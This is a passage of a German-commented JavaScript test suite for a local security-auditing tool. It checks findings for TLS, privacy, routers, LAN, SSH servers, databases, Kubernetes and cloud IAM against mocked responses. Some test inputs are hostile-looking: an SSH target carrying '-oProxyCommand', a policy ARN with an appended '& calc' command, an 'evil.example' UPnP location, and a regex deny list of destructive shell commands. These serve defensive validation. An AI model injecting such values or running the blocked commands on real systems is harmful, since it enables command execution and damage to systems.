    const subs = await netc.subdomains('example.com', { dns: { resolve4: async (n) => { if (n === 'api.example.com' || n === 'dev.example.com') return ['1.2.3.4']; throw nx(); }, resolve6: async () => { throw nx(); }, resolveCname: async () => { throw nx(); } } }, { host: 'www.example.com', deep: false, allowlist: ['api.example.com'], crtsh: async () => { crtCalled = true; return []; }, probe: async (h) => { check('subdomains: nur freigegebene Hosts kontaktiert', h === 'api.example.com'); return { ok: true, authorized: true, chain: [{ validTo: soon }] }; } });
    all.push(...subs.findings); notesAll.push(...subs.notes);
    check('subdomains: Zertifikat der freigegebenen läuft ab, andere nur als Vorschlag', subs.findings.some((f) => f.ruleId === 'tls-cert-expiring' && f.severity === 'high' && /api\.example\.com/.test(f.title)) && subs.findings.some((f) => f.ruleId === 'subdomains-not-allowed' && /dev\.example\.com/.test(f.evidence)) && !crtCalled);
    const tlsF = netc.tlsDeepFindings('https://example.com', { ok: true, authorized: false, authError: 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', chain: [{ validTo: new Date(Date.now() + 200 * day).toUTCString(), ocspUrl: 'http://ocsp.example' }, { subject: 'Example CA R1', validTo: new Date(Date.now() + 10 * day).toUTCString() }], ocspStapled: false }, 'h2=":443"');
    all.push(...tlsF);
    check('tls: Kette unvollständig, Zwischenzertifikat läuft ab, kein OCSP-Stapling, kein HTTP/3', ['tls-chain-incomplete', 'tls-intermediate-expiring', 'tls-no-ocsp-stapling', 'http3-not-advertised'].every((x) => ids(tlsF).includes(x)));
    check('tls: HTTP/3 angekündigt -> kein Befund', !ids(netc.tlsDeepFindings('https://example.com', { ok: true, authorized: true, chain: [] }, 'h3=":443"; ma=86400')).includes('http3-not-advertised'));

    // Seitenauswertung ohne Netz
    const priv = pg.privacyFindings('https://shop.example', { observed: true, requests: [{ url: 'https://www.googletagmanager.com/gtag/js?id=G-1' }, { url: 'https://fonts.googleapis.com/css2?family=Roboto' }, { url: 'https://www.youtube.com/embed/x' }, { url: 'https://cdn.other.com/a.js' }, { url: 'https://img.shop.example/a.png' }], cookies: [{ name: '_ga', domain: '.shop.example' }, { name: 'sid', domain: 'shop.example' }] });
    all.push(...priv);
    check('datenschutz: Tracking, Google Fonts, Video, Fremdserver, Cookies vor Einwilligung', ['privacy-tracking-before-consent', 'privacy-external-fonts', 'privacy-embeds-before-consent', 'privacy-third-party-hosts', 'privacy-cookies-before-consent'].every((x) => ids(priv).includes(x)) && !priv.find((f) => f.ruleId === 'privacy-third-party-hosts').evidence.includes('img.shop.example'));
    const gated = pg.pageResources([{ url: 'https://shop.example/', html: '<script type="text/plain" data-cookieconsent="statistics" src="https://www.googletagmanager.com/gtag/js"></script>' }]).resources.filter((r) => !/text\/plain/.test(r.type || ''));
    check('datenschutz: per Consent-Tool blockiertes Skript zählt nicht', !pg.privacyFindings('https://shop.example', { requests: gated }).length);
    const buf = Buffer.from('console.log(1)');
    const sri = pg.sriSnippet('https://shop.example', [{ src: 'https://cdn.example/lib@1.2.3/x.min.js', integrity: '' }, { src: 'https://cdn.example/latest.js', integrity: '' }, { src: 'https://cdn.example/ok-2.0.0.js', integrity: 'sha384-abc' }], new Map([['https://cdn.example/lib@1.2.3/x.min.js', buf], ['https://cdn.example/latest.js', buf]]));
    all.push(...sri);
    check('sri: sha384 für versionierte Skripte, unversionierte nur genannt', sri.length === 1 && sri[0].patch.includes(`integrity="sha384-${crypto.createHash('sha384').update(buf).digest('base64')}"`) && !sri[0].patch.includes('latest.js') && /cdn\.example/.test(sri[0].description));
    const good = new Headers({ 'content-security-policy': "default-src 'self'; frame-ancestors 'none'", 'strict-transport-security': 'max-age=63072000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'referrer-policy': 'strict-origin-when-cross-origin' });
    const og = pg.observatory('https://a.example', good, { https: true, redirectsToHttps: true, origin: 'https://a.example' })[0];
    const ob = pg.observatory('https://a.example', new Headers(), { https: true, redirectsToHttps: false, origin: 'https://a.example' })[0];
    all.push(og, ob);
    check('observatory: gute Header A+, fehlende Header F', /Note A\+/.test(og.title) && /Note F/.test(ob.title) && ob.steps.length >= 5);
    const sp = pg.speedFindings('https://a.example', { ttfb: 2100, dcl: 3000, lcp: 5200, cls: 0.4, bytes: 7 * 1024 * 1024, requests: 180 });
    all.push(...sp);
    check('ladezeit: langsame Seite als niedrig mit Messwerten', sp[0].severity === 'low' && /7168 KB, 180 Anfragen/.test(sp[0].title));
    all.push(...pg.a11yFindings('https://a.example', { lang: '', imgNoAlt: 2, unlabeled: 1, contrast: 6, contrastEx: [{ text: 'grau', ratio: 2.1 }] }));
    check('barrierefreiheit: Kontrast aus dem Browser', all.some((f) => f.ruleId === 'a11y-contrast-low' && f.severity === 'low') && all.some((f) => f.ruleId === 'a11y-lang-missing'));
    const cw = pg.changeWatch({ origin: 'https://a.example', scripts: [{ url: 'https://cdn.example/lib-1.0.0.js', sha256: 'b'.repeat(64) }], forms: [] }, { at: '2026-11-01', scripts: [{ url: 'https://cdn.example/lib-1.0.0.js', sha256: 'a'.repeat(64) }], forms: [] });
    all.push(...cw);
    check('wächter: geänderter Inhalt einer festen Skript-Version', ids(cw).includes('watch-third-party-script-changed'));
    check('browser: Sammel-Skript ist gültiges JavaScript', (() => { try { new Function('return ' + pg.DOM_COLLECT_SCRIPT); return true; } catch { return false; } })());
    all.push(...pg.seoFindings('https://a.example/', '<html><head></head></html>', { robots: { status: 404 }, sitemap: { status: 404 } }), ...pg.legalFindings('https://a.example/', { imprint: null, privacy: null }));
    all.push(...require('../src/core/modules/websuite').securityTxtFindings('https://a.example', { ok: true, status: 404, body: '' }));
    // Store: Vergleichsstand je Ziel
    const st = require('../src/core/store');
    const db = st.emptyStore();
    const tg = [{ type: 'url', value: 'https://a.example/' }];
    st.applyRun(db, { targets: tg, findings: [], scannersRun: [], webWatch: { 'https://a.example/': { at: 'x', scripts: [{ url: 'u' }], forms: [] } } });
    check('wächter: Stand wird je Ziel gespeichert und wieder geliefert', st.webWatchFor(db, tg)['https://a.example/'].scripts[0].url === 'u');

    // Englisch: alle neuen Befund- und Hinweistexte uebersetzt
    const GER = /[äöüß]|\b(der|die|das|und|nicht|ist|mit|für|oder|wird|werden|auf|eine?|zu|von|bei|nach|aus|sich)\b/;
    const en = all.map(i18n.localizeFinding);
    const left = en.flatMap((f) => [f.title, f.description, f.impact, f.remediation, ...(f.steps || [])]).filter((t) => t && GER.test(t));
    check('englisch: neue Web-Befunde vollständig übersetzt', left.length === 0, left.slice(0, 3).join(' | '));
    const leftNotes = notesAll.map((n) => i18n.translate(n)).filter((t) => GER.test(t));
    check('englisch: neue Web-Hinweise übersetzt', leftNotes.length === 0, leftNotes.slice(0, 3).join(' | '));
    if (left.length) console.log('    Unübersetzt:', left.slice(0, 6));
    if (leftNotes.length) console.log('    Unübersetzt (Hinweise):', leftNotes.slice(0, 6));
  }
  // --- Dateien, Programme, Erkennungsdaten (Archive, Mails, Skripte, LNK, PE, Bibliotheken, Feeds, Ueberwachung) ---
  await require('./files-feeds')(check);
  // --- Erweiterte System-Pruefungen: PC, Netz, Server, Cloud & Konten (alles mit Attrappen) ---
  {
    const fs = require('fs'), os = require('os'), path = require('path'), net = require('net'), crypto = require('crypto');
    const L = require('../src/core/systems/local');
    const N = require('../src/core/systems/network');
    const R = require('../src/core/systems/remote');
    const I = require('../src/core/systems/iam');
    const S = require('../src/core/systems/saas');
    const sys = require('../src/core/systems');
    const i18n = require('../src/core/findings-i18n');
    const all = [], allNotes = [];
    const keep = (r) => { all.push(...(r.findings || [])); allNotes.push(...(r.notes || [])); return r; };
    const ids = (arr) => arr.map((f) => f.ruleId);
    const say = () => {};
    const stubRun = (map, log = []) => async (cmd, args, o = {}) => { log.push({ cmd, args, o }); const key = [cmd, ...args].join(' '); const hit = Object.entries(map).find(([k]) => key.includes(k)); return hit ? { ok: true, code: 0, stdout: typeof hit[1] === 'function' ? hit[1](o) : hit[1], stderr: '' } : { ok: false, code: 1, stdout: '', stderr: 'nicht gefunden', error: 'nicht gefunden' }; };
    const fakeFetch = (routes, log = []) => async (url, opts = {}) => { log.push({ url, method: opts.method || 'GET', headers: opts.headers || {} }); const hit = routes.find(([re]) => re.test(url)); const [, status = 404, body = {}, hdr = {}] = hit || []; return { ok: status >= 200 && status < 300, status, headers: { get: (k) => (hdr[k.toLowerCase()] ?? null) }, text: async () => (typeof body === 'string' ? body : JSON.stringify(body)) }; };

    // Programme
    const row = (a) => a[0].padEnd(14) + a[1].padEnd(22) + a[2].padEnd(10) + a[3].padEnd(11) + a[4];
    const wgOut = '\r   - \r' + [row(['Name', 'Id', 'Version', 'Available', 'Source']), '-'.repeat(64), row(['7-Zip 23.01', '7zip.7zip', '23.01', '24.09', 'winget']), row(['Zoom', 'Zoom.Zoom', '5.0', '6.0', 'winget']), '2 upgrades available.'].join('\n');
    check('programme: winget-Tabelle wird gelesen (mit Fortschrittszeichen)', JSON.stringify(L.parseWingetUpgrade(wgOut).map((u) => [u.name, u.available])) === '[["7-Zip 23.01","24.09"],["Zoom","6.0"]]');
    const apps = [{ n: '7-Zip 23.01 (x64)', v: '23.01' }, { n: 'PuTTY release 0.81 (64-bit)', v: '0.81.0.0' }, { n: 'WinRAR 7.01 (64-bit)', v: '7.01.0' }];
    const wa = keep(await L.auditWinApps({ say, platform: 'win32', run: stubRun({ 'powershell.exe': JSON.stringify(apps), winget: wgOut }) }));
    check('programme: verwundbare Versionen (7-Zip, WinRAR), PuTTY aktuell, Updates per winget', ids(wa.findings).filter((x) => x === 'winapp-vulnerable').length === 2 && !wa.findings.some((f) => /PuTTY/.test(f.title)) && wa.findings.some((f) => f.ruleId === 'winapp-update-available' && /Zoom/.test(f.title)) && !wa.findings.some((f) => f.ruleId === 'winapp-update-available' && /7-Zip/.test(f.title)) && wa.ok);
    check('programme: nur unter Windows', /nur unter Windows/.test((await L.auditWinApps({ say, platform: 'linux' })).notes[0]));

    // Browser-Erweiterungen aus einem nachgebauten Profil
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-ext-'));
    const ext = path.join(tmp, 'chrome', 'Default', 'Extensions', 'a'.repeat(32), '1.2.0');
    fs.mkdirSync(path.join(ext, '_locales', 'en'), { recursive: true });
    fs.writeFileSync(path.join(ext, 'manifest.json'), JSON.stringify({ name: '__MSG_appName__', default_locale: 'en', version: '1.2.0', permissions: ['webRequest', 'nativeMessaging', 'storage'], host_permissions: ['<all_urls>'] }));
    fs.writeFileSync(path.join(ext, '_locales', 'en', 'messages.json'), JSON.stringify({ appName: { message: 'Super Helper' } }));
    const ff = path.join(tmp, 'ff', 'abc.default');
    fs.mkdirSync(ff, { recursive: true });
    fs.writeFileSync(path.join(ff, 'extensions.json'), JSON.stringify({ addons: [{ id: 'x@y', type: 'extension', location: 'app-profile', version: '1', defaultLocale: { name: 'Fox Tool' }, userPermissions: { permissions: ['tabs'], origins: ['*://*/*'] } }, { id: 'sys@moz', type: 'extension', location: 'app-system-defaults' }] }));
    const roots = { chromium: [['Chrome', path.join(tmp, 'chrome')]], firefox: path.join(tmp, 'ff') };
    const exts = L.collectExtensions(roots);
    check('browser: Erweiterungen aus Chrome- und Firefox-Profil gelesen (Name aus _locales)', exts.length === 2 && exts.some((e) => e.name === 'Super Helper') && exts.some((e) => e.name === 'Fox Tool'));
    const be = keep(await L.auditBrowserExt({ say, roots, fetchImpl: fakeFetch([[/malicious-extensions-list/, 200, `# Liste\n${'a'.repeat(32)} # bad\n`]]) }));
    check('browser: schädlich laut Feed, nativeMessaging, alle Seiten + webRequest, Firefox alle Seiten', ['browserext-malicious', 'browserext-native-messaging', 'browserext-broad-access', 'browserext-all-sites'].every((x) => ids(be.findings).includes(x)));
    fs.rmSync(tmp, { recursive: true, force: true });

    // Datensicherung und macOS
    const bk = L.parseBackup({ fh: false, kfm: [], srInterval: 0, drives: [{ id: 'E:', type: 2, bl: 2 }, { id: 'D:', type: 3, bl: 2 }] });
    all.push(...bk);
    check('sicherung: keine Sicherung, Wiederherstellung aus, Wechsellaufwerk unverschlüsselt, Test-Hinweis', ['backup-none', 'backup-restore-off', 'backup-drive-unencrypted', 'backup-restore-test'].every((x) => ids(bk).includes(x)) && ids(bk).filter((x) => x === 'backup-drive-unencrypted').length === 1);
    const bk2 = L.parseBackup({ fh: true, fhDays: 40, fhTarget: 'F:\\FileHistory', kfm: ['Documents'], srInterval: 1, rpDays: 3, drives: [{ id: 'F:', type: 3, bl: 0 }] });
    all.push(...bk2);
    check('sicherung: alte Dateiversionsverlauf-Sicherung, Ziel-Laufwerk unverschlüsselt', ids(bk2).includes('backup-filehistory-stale') && bk2.some((f) => /Sicherungslaufwerk F:/.test(f.title)) && !ids(bk2).includes('backup-none'));
    const mac = keep(await L.auditMacos({ say, platform: 'darwin', run: stubRun({ fdesetup: 'FileVault is Off.', spctl: 'assessments disabled', csrutil: 'System Integrity Protection status: disabled.', socketfilterfw: 'Firewall is disabled. (State = 0)', 'defaults read': '0', sw_vers: '14.6', softwareupdate: 'Software Update found the following:\n* Label: macOS Sonoma 14.7\n* Label: Safari 18\n' }) }));
    check('macos: FileVault, Gatekeeper, SIP, Firewall, Updates, Auto-Update', ['mac-filevault-off', 'mac-gatekeeper-off', 'mac-sip-off', 'mac-firewall-off', 'mac-updates-pending', 'mac-autoupdate-off'].every((x) => ids(mac.findings).includes(x)));
    check('macos: läuft nur auf einem Mac', /nur auf einem Mac/.test((await L.auditMacos({ say, platform: 'win32' })).notes[0]));

    // Router
    check('router: Gateway aus Windows-, Linux- und macOS-Ausgabe', N.parseGateway('192.168.178.1\r\n') === '192.168.178.1' && N.parseGateway('default via 192.168.1.1 dev eth0') === '192.168.1.1' && N.parseGateway('   route to: default\n    gateway: 10.0.0.1\n') === '10.0.0.1');
    const gets = [];
    const routerHttp = async (url) => { gets.push(url); if (/jason_boxinfo/.test(url)) return { status: 200, headers: {}, body: '<j:BoxInfo><j:Name>FRITZ!Box 7490</j:Name><j:Version>113.07.29</j:Version></j:BoxInfo>' }; if (/^http:\/\/192\.168\.178\.1\/$/.test(url)) return { status: 200, headers: {}, body: '<title>FRITZ!Box</title><input type="password">' }; if (/desc\.xml/.test(url)) return { status: 200, headers: {}, body: '<manufacturer>AVM</manufacturer><modelName>FRITZ!Box 7490</modelName>' }; return null; };
    const ssdpGw = async () => [{ ip: '192.168.178.1', headers: { st: 'urn:schemas-upnp-org:device:InternetGatewayDevice:1', location: 'http://192.168.178.1:49000/desc.xml' } }, { ip: '192.168.178.1', headers: { st: 'upnp:rootdevice', location: 'http://evil.example/x.xml' } }];
    const rt = keep(await N.auditRouter({ say, platform: 'win32', run: stubRun({ 'powershell.exe': '192.168.178.1\r\n' }), deps: { httpGet: routerHttp, ssdp: ssdpGw } }));
    check('router: HTTP-Oberfläche, UPnP an, veraltetes FRITZ!OS 7.29', ['router-info', 'router-admin-http', 'router-upnp', 'router-firmware-old'].every((x) => ids(rt.findings).includes(x)) && rt.findings.some((f) => /7490/.test(f.title)));
    check('router: nur GET an das eigene Gateway (keine fremden Adressen)', gets.every((u) => /^https?:\/\/192\.168\.178\.1[:/]/.test(u)));
    check('router: öffentliches Gateway wird übersprungen', /keine private Adresse/.test((await N.auditRouter({ say, platform: 'linux', run: stubRun({ 'ip route': 'default via 8.8.8.8 dev eth0' }), deps: { httpGet: routerHttp, ssdp: ssdpGw } })).notes[0]));

    // Lokales Netz
    check('netz: ARP-Tabelle (Windows und macOS/Linux), Broadcast/Multicast ignoriert', JSON.stringify(N.parseArp('  192.168.1.20          aa-bb-cc-dd-ee-01     dynamisch\n  192.168.1.255         ff-ff-ff-ff-ff-ff     statisch\n? (192.168.1.30) at aa:bb:cc:dd:ee:2 on en0\n  224.0.0.22  01-00-5e-00-00-16 statisch').map((a) => a.ip)) === '["192.168.1.20","192.168.1.30"]');
    const lbl = (n) => Buffer.concat([...n.split('.').map((l) => Buffer.concat([Buffer.from([l.length]), Buffer.from(l)])), Buffer.from([0])]);
    const rdata = lbl('_ipp._tcp.local');
    const ans = Buffer.concat([lbl('_services._dns-sd._udp.local'), Buffer.from([0, 12, 0, 1, 0, 0, 0, 120, 0, rdata.length]), rdata]);
    const hdr = Buffer.alloc(12); hdr.writeUInt16BE(0x8400, 2); hdr.writeUInt16BE(1, 6);
    check('netz: mDNS-Antwort wird gelesen (Dienst-Arten)', N.parseMdns(Buffer.concat([hdr, ans]))[0] === '_ipp._tcp.local' && N.mdnsQuery().length > 12);
    const probed = [];
    const tcp = async (ip, port) => { probed.push(`${ip}:${port}`); return (ip === '192.168.1.20' && port === 23) || (ip === '192.168.1.30' && port === 80); };
    const lanDeps = { nets: [{ address: '192.168.1.10', bits: 24 }], ssdp: async () => [{ ip: '192.168.1.20', headers: { server: 'Linux UPnP/1.0 Sonos/70' } }, { ip: '10.9.9.9', headers: {} }], mdns: async () => ({ '192.168.1.30': ['_ipp._tcp.local'], '8.8.8.8': ['_x._tcp.local'] }), tcp, httpGet: async () => ({ status: 200, body: '<title>Drucker-Admin</title>' }) };
    const arpTxt = '  192.168.1.20  aa-bb-cc-dd-ee-01  dynamisch\n  192.168.2.5  aa-bb-cc-dd-ee-03  dynamisch\n  192.168.1.10  aa-bb-cc-dd-ee-04  dynamisch';
    const lanOff = keep(await N.auditLan({ say, run: stubRun({ arp: arpTxt }), settings: {}, deps: lanDeps }));
    check('netz: ohne Bestätigung nur passiv (keine Verbindungsversuche)', probed.length === 0 && ids(lanOff.findings).join() === 'lan-inventory' && /2 Geräte/.test(lanOff.findings[0].title));
    const lan = keep(await N.auditLan({ say, run: stubRun({ arp: arpTxt }), settings: { lanPortCheck: true }, deps: lanDeps }));
    check('netz: Telnet und Weboberfläche ohne HTTPS gefunden', ['lan-inventory', 'lan-telnet', 'lan-admin-http'].every((x) => ids(lan.findings).includes(x)) && lan.findings.some((f) => /Drucker-Admin/.test(f.title)));
    check('netz: Ports nur an privaten Adressen im eigenen Subnetz, nie am eigenen PC', probed.length > 0 && probed.every((p) => /^192\.168\.1\.(20|30):/.test(p)));

    // Linux per SSH
    check('ssh: festes Skript nur aus nur-lesenden Befehlen', !/(?<![/@\w-])(rm|mv|cp|tee|chmod|chown|useradd|usermod|passwd|kill|reboot|shutdown|install|systemctl\s+(start|stop|restart|enable|disable))(?![\w-])|sed\s+-i|>\s*(?!\/dev\/null|&)/.test(R.SSH_SCRIPT.replace(/2>&1|2>\/dev\/null|>\/dev\/null/g, '')) && R.SSH_SCRIPT === R.SSH_ALLOWED.join('\n') + '\n');
    const sshOut = ['@@os', 'PRETTY_NAME="Ubuntu 22.04"', '@@updates', '12', '3', '@@reboot', 'yes', '@@sshd', 'PermitRootLogin yes', 'PasswordAuthentication yes', 'MaxAuthTries 6', '@@uid0', 'root', 'toor', '@@emptypw', 'guest', '@@sudoers', 'deploy ALL=(ALL) NOPASSWD: ALL', '@@firewall', 'Status: inactive', 'nft-input: 0', '-P INPUT ACCEPT', '@@listen', 'tcp   LISTEN 0 511 0.0.0.0:6379 0.0.0.0:*', 'tcp   LISTEN 0 128 0.0.0.0:22 0.0.0.0:*', 'tcp   LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*', '@@end'].join('\n');
    const sshLog = [];
    const lx = keep(await R.auditLinuxSsh({ say, settings: { sshTarget: 'audit@srv.example.org:2222', sshKeyPath: __filename }, run: stubRun({ ssh: sshOut }, sshLog) }));
    check('ssh: Updates, root-Login, Passwort, UID 0, leeres Passwort, NOPASSWD, Firewall, Redis offen', ['linux-security-updates', 'linux-reboot-required', 'linux-ssh-root-login', 'linux-ssh-password-auth', 'linux-ssh-maxauthtries', 'linux-uid0', 'linux-empty-password', 'linux-sudo-nopasswd', 'linux-no-firewall', 'linux-service-public'].every((x) => ids(lx.findings).includes(x)) && lx.findings.filter((f) => f.ruleId === 'linux-service-public').length === 1);
    const sa = sshLog[0] || { args: [], o: {} };
    check('ssh: System-ssh mit BatchMode, eigenem Schlüssel und festem Skript über stdin', sa.cmd === 'ssh' && sa.args.includes('BatchMode=yes') && sa.args.includes(__filename) && sa.args.includes('2222') && sa.args[sa.args.length - 1] === 'sh -s' && sa.o.input === R.SSH_SCRIPT);
    check('ssh: ungültiges Ziel wird nicht verbunden', /kein SSH-Ziel/.test((await R.auditLinuxSsh({ say, settings: { sshTarget: '-oProxyCommand=x@y' }, run: stubRun({}) })).notes[0]));

    // Datenbanken
    const pg = R.parseDbUrl('postgresql://audit:geheim@db.example.org:5433/app');
    check('db: Verbindungs-URL wird zerlegt', pg.kind === 'postgres' && pg.port === 5433 && pg.password === 'geheim' && pg.db === 'app' && R.parseDbUrl('rediss://h').tls === true && !R.parseDbUrl('ftp://x'));
    const pgEnv = [];
    const pgRun = async (cmd, args, o) => { pgEnv.push({ cmd, args, env: o.env }); const sql = args[args.length - 1]; const out = /server_version/.test(sql) ? '12.4' : /rolsuper AND/.test(sql) ? 'postgres\nadmin\nbackup' : /current_user/.test(sql) ? 't' : /has_schema_privilege/.test(sql) ? 't' : /trust/.test(sql) ? '1' : '2'; return { ok: true, stdout: out + '\n' }; };
    const pgr = await R.probeDb(pg, { run: pgRun, wire: async () => ({ ok: true, data: Buffer.from('N') }) });
    const pgf = R.assessDb(pg, pgr.facts);
    all.push(...pgf);
    check('db: PostgreSQL ohne TLS, veraltet, viele Superuser, public-Schema, trust', ['db-version-eol', 'db-no-tls', 'db-many-superusers', 'db-audit-user-superuser', 'db-pg-public-create', 'db-pg-trust'].every((x) => ids(pgf).includes(x)));
    check('db: Passwort nur über Umgebungsvariable, nie in der Befehlszeile', pgEnv.every((e) => e.env.PGPASSWORD === 'geheim' && !e.args.some((a) => /geheim/.test(a))));
    const greet = Buffer.alloc(60); greet[4] = 10; greet.write('5.7.44-log\0', 5); greet.writeUInt16LE(0x0000, 5 + 11 + 4 + 8 + 1);
    check('db: MySQL-Begrüßung liefert Version und TLS-Fähigkeit', JSON.stringify(R.parseMysqlGreeting(greet)) === '{"version":"5.7.44-log","ssl":false}');
    const my = R.parseDbUrl('mysql://root@10.0.0.7');
    const myf = R.assessDb(my, (await R.probeDb(my, { run: stubRun({ 'require_secure_transport': 'require_secure_transport\tOFF', 'Super_priv': 'root@%', authentication_string: 'app@%' }), wire: async () => ({ ok: true, data: greet }) })).facts);
    all.push(...myf);
    check('db: MySQL veraltet, ohne TLS, Konto ohne Passwort', ['db-version-eol', 'db-no-tls', 'db-empty-password'].every((x) => ids(myf).includes(x)));
    const mg = R.parseDbUrl('mongodb://10.0.0.8');
    const mongoWire = async (h, p, { send }) => { const req = R.mongoReply(send); const doc = req.hello ? { ok: 1, isWritablePrimary: true } : req.buildInfo ? { ok: 1, version: '6.0.12' } : { ok: 1, databases: [{ name: 'shop' }] }; return { ok: true, data: R.mongoMsg(doc) }; };
    check('db: BSON hin und zurück', R.bsonDecode(R.bsonEncode({ a: 'x', b: 2, c: true })).b === 2);
    const mgf = R.assessDb(mg, (await R.probeDb(mg, { run: stubRun({}), wire: mongoWire })).facts);
    all.push(...mgf);
    check('db: MongoDB ohne Anmeldung lesbar, bekannte Lücke, unverschlüsselt', ['db-anonymous-access', 'db-version-vuln', 'db-no-tls', 'db-version-eol'].every((x) => ids(mgf).includes(x)) && mgf.find((f) => f.ruleId === 'db-anonymous-access').severity === 'critical');
    // Redis gegen einen lokalen Test-Server (echtes Protokoll, kein fremdes System)
    const srv = net.createServer((c) => c.on('data', (d) => { if (/INFO/.test(d.toString())) { const body = '# Server\r\nredis_version:7.2.4\r\n'; c.write(`$${body.length}\r\n${body}\r\n`); } }));
    await new Promise((r) => srv.listen(0, '127.0.0.1', r));
    const rd = { ...R.parseDbUrl(`redis://127.0.0.1:${srv.address().port}`) };
    const rdp = await R.probeDb(rd, { run: stubRun({}) });
    srv.close();
    const rdf = R.assessDb({ ...rd, host: '10.0.0.9' }, rdp.facts || {});
    all.push(...rdf);
    check('db: Redis ohne Passwort lesbar, Version 7.2.4 mit bekannter Lücke', rdp.facts && rdp.facts.version === '7.2.4' && ['db-anonymous-access', 'db-version-vuln', 'db-no-tls'].every((x) => ids(rdf).includes(x)));
    const dbr = keep(await R.auditDb({ say, settings: { dbUrls: 'redis://127.0.0.1:9\nkein-url' }, run: stubRun({}) }));
    check('db: nicht erreichbar gilt nicht als geprüft', dbr.ok === false && /nicht erreichbar/.test(dbr.notes.join(' ')));

    // Kubernetes
    const pods = [{ metadata: { name: 'web-7d9f8c6b5d-abcde', namespace: 'shop', ownerReferences: [{ name: 'web-7d9f8c6b5d' }] }, spec: { hostNetwork: true, volumes: [{ hostPath: { path: '/var/run/docker.sock' } }], containers: [{ securityContext: { privileged: true }, env: [{ name: 'DB_PASS', valueFrom: { secretKeyRef: { name: 'db' } } }] }] } }, { metadata: { name: 'web-7d9f8c6b5d-fghij', namespace: 'shop', ownerReferences: [{ name: 'web-7d9f8c6b5d' }] }, spec: { containers: [{ securityContext: { privileged: true } }] } }, { metadata: { name: 'dns', namespace: 'kube-system' }, spec: { containers: [{ securityContext: { privileged: true } }] } }];
    const k8sRun = stubRun({ 'current-context': 'prod', 'get pods': JSON.stringify({ items: pods }), clusterrolebindings: JSON.stringify({ items: [{ metadata: { name: 'dev-admin' }, roleRef: { name: 'cluster-admin' }, subjects: [{ kind: 'User', name: 'mia@example.org' }] }, { metadata: { name: 'sys' }, roleRef: { name: 'cluster-admin' }, subjects: [{ kind: 'Group', name: 'system:masters' }] }] }), networkpolicies: JSON.stringify({ items: [] }), namespaces: JSON.stringify({ items: [{ metadata: { name: 'shop' } }, { metadata: { name: 'kube-system' } }] }) });
    const kl = [];
    const k8 = keep(await R.auditK8s({ say, run: async (c, a, o) => { kl.push(a); return k8sRun(c, a, o); } }));
    check('k8s: privilegiert (einmal je Workload), hostPath, Host-Netz, Secret-env, cluster-admin, ohne NetworkPolicy', ['k8s-live-privileged', 'k8s-live-hostpath', 'k8s-live-host-namespace', 'k8s-live-secret-env', 'k8s-live-cluster-admin', 'k8s-live-no-networkpolicy'].every((x) => ids(k8.findings).includes(x)) && ids(k8.findings).filter((x) => x === 'k8s-live-privileged').length === 1 && ids(k8.findings).filter((x) => x === 'k8s-live-cluster-admin').length === 1);
    check('k8s: nur lesende kubectl-Befehle (config current-context / get)', kl.every((a) => a[0] === 'get' || (a[0] === 'config' && a[1] === 'current-context')));

    // Cloud-IAM
    const now = Date.parse('2026-11-01T00:00:00Z');
    const csv = 'user,arn,user_creation_time,password_enabled,password_last_used,mfa_active,access_key_1_active,access_key_1_last_rotated,access_key_1_last_used_date,access_key_2_active,access_key_2_last_rotated,access_key_2_last_used_date\n<root_account>,arn,2020-01-01,not_supported,2026-10-20T10:00:00+00:00,true,false,N/A,N/A,false,N/A,N/A\nmia,arn,2021-01-01,true,2026-10-01,false,true,2025-01-01T00:00:00+00:00,2025-03-01T00:00:00+00:00,true,2025-06-01T00:00:00+00:00,2026-10-30T00:00:00+00:00';
    const aw = I.parseAwsIam({ report: I.parseCredentialReport(csv), policies: [{ arn: 'arn:aws:iam::123456789012:policy/all', name: 'all', document: { Statement: { Effect: 'Allow', Action: '*', Resource: '*' } } }], trails: [{ Name: 't', TrailARN: 'arn:aws:cloudtrail:eu-central-1:123456789012:trail/t', IsMultiRegionTrail: false }], trailStatus: { 'arn:aws:cloudtrail:eu-central-1:123456789012:trail/t': false } }, now);
    all.push(...aw);
    check('iam: AWS root benutzt, ohne MFA, ungenutzter + alter Schlüssel, *-Richtlinie, Trail aus', ['iam-root-used', 'iam-user-no-mfa', 'iam-key-unused', 'iam-key-old', 'iam-wildcard-policy', 'iam-trail-stopped', 'iam-trail-not-multiregion'].every((x) => ids(aw).includes(x)));
    const az = I.parseAzureIam({ assignments: ['a', 'b', 'c', 'd'].map((n) => ({ roleDefinitionName: 'Owner', scope: '/subscriptions/1', principalName: n })).concat([{ roleDefinitionName: 'Owner', scope: '/subscriptions/1', principalName: 'x_gmail.com#EXT#@t.onmicrosoft.com' }]), customRoles: [{ roleName: 'god', permissions: [{ actions: ['*'] }] }], diag: [] });
    all.push(...az);
    check('iam: Azure Gast-Besitzer, viele Besitzer, *-Rolle, kein Aktivitätsprotokoll', ['iam-guest-owner', 'iam-many-owners', 'iam-wildcard-policy', 'iam-no-audit-log'].every((x) => ids(az).includes(x)));
    const gc = I.parseGcpIam({ policy: { bindings: [{ role: 'roles/owner', members: ['user:a@x', 'user:b@x', 'user:c@x', 'user:d@x', 'serviceAccount:ci@p.iam.gserviceaccount.com'] }, { role: 'roles/viewer', members: ['allUsers'] }] }, keys: [{ account: 'ci@p.iam.gserviceaccount.com', validAfterTime: '2025-01-01T00:00:00Z' }] }, now);
    all.push(...gc);
    check('iam: GCP viele Besitzer, Dienstkonto-Owner, öffentlich, keine Datenzugriffs-Logs, alter Schlüssel', ['iam-many-owners', 'iam-sa-owner', 'iam-public-binding', 'iam-no-data-access-logs', 'iam-key-old'].every((x) => ids(gc).includes(x)));
    const iamLog = [];
    const iamR = keep(await I.auditIam({ say, run: stubRun({ 'sts get-caller-identity': '{}', 'get-credential-report': JSON.stringify({ Content: Buffer.from(csv).toString('base64') }), 'list-policies': JSON.stringify({ Policies: [{ Arn: 'arn:aws:iam::123456789012:policy/all', PolicyName: 'all', DefaultVersionId: 'v1' }, { Arn: 'arn:aws:iam::1:policy/x & calc', DefaultVersionId: 'v1' }] }), 'get-policy-version': JSON.stringify({ PolicyVersion: { Document: encodeURIComponent(JSON.stringify({ Statement: [{ Effect: 'Allow', Action: ['*'], Resource: '*' }] })) } }), 'describe-trails': JSON.stringify({ trailList: [] }) }, iamLog) }));
